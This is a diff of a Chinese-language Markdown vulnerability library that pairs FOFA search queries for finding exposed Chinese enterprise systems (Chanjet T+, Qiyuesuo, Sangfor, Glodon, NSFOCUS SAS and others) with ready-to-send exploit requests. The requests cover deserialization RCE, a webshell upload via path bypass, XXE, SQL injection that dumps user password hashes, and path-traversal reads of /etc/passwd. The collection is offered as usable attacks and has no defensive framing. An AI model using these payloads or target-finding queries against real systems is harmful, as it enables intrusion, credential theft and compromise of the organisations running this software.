@@ -1,7 +1,7 @@
 ## 这里就是漏洞库了
 
 ### 用友畅捷通T
-- fofa语法：`app="畅捷通-TPlus"`
+> fofa语法：`app="畅捷通-TPlus"`
 
 #### 畅捷通T+ 反序列化漏洞（QVD-2023-13615）
 
@@ -9,7 +9,7 @@
 
 简介：在.NET处理 Ajax应用的时候，通常序列化功能由JavaSerializer类提供，它是.NET2.0之后内部实现的序列化功能的类，位于命名空间System.Web..Serialization、通过System.Web.Extensions引用，让开发者轻松实现.Net中所有类型和Json数据之间的转换，但在某些场景下开发者使用Deserialize 或DeserializeObject方法处理不安全的Json数据时会造成反序列化攻击从而实现远程RCE漏洞。
 
-- POC
+> POC
   ```
   POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
   Host: your-ip
@@ -35,7 +35,7 @@
 
   ![这是一张图片](/images/QVD-2023-13615/3.png)
 
-- exp：
+> exp：
   ```
   POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
   Host: your-ip
@@ -65,17 +65,41 @@
 
 ### 契约锁
 
-- fofa语法：`app="契约锁-电子签署平台"`
+> fofa语法：`app="契约锁-电子签署平台"`
+
+#### 契约锁电子签章系统RCE
+
+> POC
+  ```
+  POST /callback/%2E%2E;/code/upload HTTP/1.1
+  Host: ip:port
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
+  ebp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+  Content-Type: multipart/from-data;
+
+  boundary=----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
+  ----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
+  Content-Disposition: from-data; name="type";
+
+  TIMETASK
+  ----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
+  Content-Disposition: from-data; name="file"; filename="qys.jpg"
+
+  马儿
+
+  ----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
+  ```
 
 ------
 
 ### 深信服 DC数据中心管理系统
 
-- fofa语法：`app="SANGFOR-数据中心"`
+> fofa语法：`app="SANGFOR-数据中心"`
 
 #### 深信服数据中心管理系统 XXE漏洞
 
-- POC
+> POC
   ```
   POST /src/sangforindex HTTP/1.1
   Host: your-ip
@@ -90,7 +114,7 @@
   </xxx>
   ```
 
-- 验证
+> 验证
 
 ![Alt text](/images/深信服/1.png)
 
@@ -100,4 +124,54 @@
 
 ------
 
-tag
+### 通达OA
+
+> fofa语法：`app="TDXK-通达OA" && icon_hash="-759108386"`
+
+------
+
+### 广联达OA
+
+> fofa语法：`fid="/yV4r5PdARKT4jaqLjJYqw==" && "/Services/Identification/Server/"`
+
+#### 广联达 LinkworksGetIMDictionarySQL 注入漏洞
+
+> POC
+  ```
+  POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
+  Host: 
+  Content-Type: application/x-www-form-urlencoded
+  key=1'UNIONALL SELECT top1concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER--
+  ```
+
+------
+
+### 深信服应用交付报表系统
+
+- fofa语法：`app="SANGFOR-应用交付报表系统" && fid="iaytNA57019/kADk8Nev7g=="`
+
+> 登录界面
+> ![Alt text](/images/深信服/3.png)
+
+### 深信服应用交付报表任意文件读取漏洞
+
+> POC:`/report/download.php?pdf=../../../../../etc/passwd`
+
+![Alt text](/images/深信服/4.png)
+
+[相关链接](https://blog.csdn.net/weixin_44268918/article/details/128964755)
+
+------
+
+### 绿盟SAS安全审计系统/堡垒机
+
+> fofa语法：`title="NSFOCUS&nbsp;SAS[H]" && body="'/needUsbkey.php?username='"`
+
+> 登录界面
+> ![Alt text](/images/绿盟/1.png)
+
+#### 绿盟sas安全审计系统任意文件读取漏洞
+
+> POC:`webconf/GetFile/index?path=…/…/…/…/…/…/…/…/…/…/…/…/…/…/etc/passwd`
+
+![Alt text](/images/绿盟/2.png)
